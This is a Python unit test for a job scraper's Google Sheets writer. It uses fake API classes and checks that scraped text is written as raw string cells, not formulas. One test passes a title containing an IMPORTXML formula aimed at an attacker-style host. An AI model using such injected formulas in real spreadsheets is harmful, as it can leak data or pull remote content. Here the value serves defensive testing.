import unittest

from jobstream.scraper.schema import Job
from jobstream.scraper.sheets import GoogleSheetsWriter


class Request:
    def __init__(self, result):
        self.result = result

    def execute(self):
        return self.result


class FakeValues:
    def __init__(self, header=None):
        self.header = header
        self.updates = []

    def get(self, **kwargs):
        return Request({"values": [self.header]} if self.header else {})

    def update(self, **kwargs):
        self.updates.append(kwargs)
        self.header = kwargs["body"]["values"][0]
        return Request({})


class FakeSpreadsheets:
    def __init__(self, header=None):
        self.values_resource = FakeValues(header)
        self.batch_updates = []

    def get(self, **kwargs):
        return Request({"sheets": [{"properties": {"sheetId": 7, "title": "jobs"}}]})

    def values(self):
        return self.values_resource

    def batchUpdate(self, **kwargs):
        self.batch_updates.append(kwargs)
        return Request({})


class FakeService:
    def __init__(self, header=None):
        self.resource = FakeSpreadsheets(header)

    def spreadsheets(self):
        return self.resource


class SheetsWriterTests(unittest.TestCase):
    def test_write_adds_header_and_uses_raw_string_cells(self):
        service = FakeService()
        writer = GoogleSheetsWriter(service, "test-spreadsheet", "jobs")
        job = Job.create(
            source="test",
            job_id="1",
            title='=IMPORTXML("https://attacker.invalid")',
            job_url="https://example.test/jobs/1",
        )

        self.assertEqual(writer.write([job]), 1)
        self.assertEqual(service.resource.values_resource.header, list(Job.HEADERS))
        request = service.resource.batch_updates[-1]["body"]["requests"]
        title_cell = request[1]["updateCells"]["rows"][0]["values"][0]
        self.assertEqual(
            title_cell["userEnteredValue"]["stringValue"],
            '=IMPORTXML("https://attacker.invalid")',
        )
        self.assertNotIn("formulaValue", title_cell["userEnteredValue"])

    def test_incompatible_header_is_rejected(self):
        service = FakeService(["unexpected"])
        writer = GoogleSheetsWriter(service, "test-spreadsheet", "jobs")

        with self.assertRaisesRegex(RuntimeError, "incompatible header"):
            writer.write([Job.create(source="test", job_id="1", title="Role")])


if __name__ == "__main__":
    unittest.main()
